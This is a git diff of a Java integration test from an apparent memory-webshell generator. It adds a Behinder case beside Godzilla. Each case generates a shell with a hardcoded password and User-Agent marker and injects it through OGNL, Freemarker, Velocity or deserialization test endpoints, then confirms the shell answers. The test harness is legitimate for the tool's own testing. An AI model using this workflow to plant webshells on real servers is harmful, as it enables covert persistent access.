@@ -1,7 +1,7 @@
 package com.reajason.javaweb.integration;
 
 import com.reajason.javaweb.GeneratorMain;
-import com.reajason.javaweb.config.*;
+import com.reajason.javaweb.memshell.config.*;
 import com.reajason.javaweb.memshell.packer.Packer;
 import lombok.extern.slf4j.Slf4j;
 
@@ -32,14 +32,14 @@ public class ShellAssertionTool {
 
         switch (shellTool) {
             case Godzilla:
-                String pass = "pass";
-                String key = "key";
-                String headerValue = "Godzilla" + shellType + packer.name();
+                String godzillaPass = "pass";
+                String godzillaKey = "key";
+                String godzillaHeaderValue = "Godzilla" + shellType + packer.name();
                 GodzillaConfig godzillaConfig = GodzillaConfig.builder()
-                        .pass(pass).key(key)
-                        .headerName("User-Agent").headerValue(headerValue)
+                        .pass(godzillaPass).key(godzillaKey)
+                        .headerName("User-Agent").headerValue(godzillaHeaderValue)
                         .build();
-                log.info("generated {} godzilla with pass: {}, key: {}, headerValue: {}", shellType, pass, key, headerValue);
+                log.info("generated {} godzilla with pass: {}, key: {}, headerValue: {}", shellType, godzillaPass, godzillaKey, godzillaHeaderValue);
                 String content = GeneratorMain.generate(shellConfig, injectorConfig, godzillaConfig, packer);
                 assertInjectIsOk(url, shellType, shellTool, content, packer);
                 GodzillaShellTool.testIsOk(shellUrl, godzillaConfig);
@@ -51,6 +51,15 @@ public class ShellAssertionTool {
                 log.info("generated {} command shell with paramName: {}", shellType, commandConfig.getParamName());
                 assertInjectIsOk(url, shellType, shellTool, commandContent, packer);
                 CommandShellTool.testIsOk(shellUrl, commandConfig);
+                break;
+            case Behinder:
+                String behinderPass = "pass";
+                String behinderHeaderValue = "Behinder" + shellType + packer.name();
+                BehinderConfig behinderConfig = BehinderConfig.builder().pass(behinderPass).headerName("User-Agent").headerValue(behinderHeaderValue).build();
+                log.info("generated {} godzilla with pass: {}, headerValue: {}", shellType, behinderPass, behinderHeaderValue);
+                String behinderContent = GeneratorMain.generate(shellConfig, injectorConfig, behinderConfig, packer);
+                assertInjectIsOk(url, shellType, shellTool, behinderContent, packer);
+                BehinderShellTool.testIsOk(shellUrl, behinderConfig);
         }
     }
 
@@ -69,8 +78,7 @@ public class ShellAssertionTool {
             case OGNL -> VulTool.postData(url + "/ognl", content);
             case Freemarker -> VulTool.postData(url + "/freemarker", content);
             case Velocity -> VulTool.postData(url + "/velocity", content);
-            case Deserialize ->
-                    VulTool.postData(url + "/java_deserialize", content);
+            case Deserialize -> VulTool.postData(url + "/java_deserialize", content);
         }
     }
 }
